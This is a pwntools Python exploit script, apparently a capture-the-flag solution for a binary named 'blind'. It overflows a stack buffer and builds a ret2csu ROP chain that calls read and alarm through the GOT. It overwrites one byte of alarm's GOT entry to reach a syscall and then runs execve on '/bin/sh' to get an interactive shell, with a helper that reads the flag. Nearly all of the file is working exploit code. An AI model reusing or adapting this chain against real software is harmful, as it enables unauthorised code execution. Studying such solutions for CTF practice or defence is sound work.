# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './blind'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def csu( call_addr ,rdi , rsi , rdx):
    pop_rbx_r15_ret = 0x4007BA
    mov_call = 0x4007A0
    arg = flat(
        0 , 1 , call_addr,
        rdx , rsi , rdi,
    )
    return flat(pop_rbx_r15_ret , arg , mov_call) 

# one_gad = one_gadget(libc.path)

def attack():
    
    # csu call 的是一个地址里的值，而不是地址本身
    # 那么我们 got 表不就正好符合要求吗
    # got 表正好就是一个二级指针

    read_got = elf.got['read']
    alarm_got = elf.got['alarm']
    main_addr = 0x4006B6
    bss_addr = 0x601088

    payload = 'a'*0x58
    payload += csu( alarm_got , 0x10000 , 0 , 0 )
    payload += csu( read_got , 0 , alarm_got , 0x50 )
    payload += csu( read_got , 0 , bss_addr , 0x60 )
    payload += csu( alarm_got , bss_addr , 0,0 )

    # dbg()
    se(payload)
    # raw_input()
    se('\x45')
    # raw_input()
    se('/bin/sh\x00'.ljust(59,'\x00'))
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   blind.py
@Time    :   2021/11/20 11:35:40
@Author  :   Niyah 
'''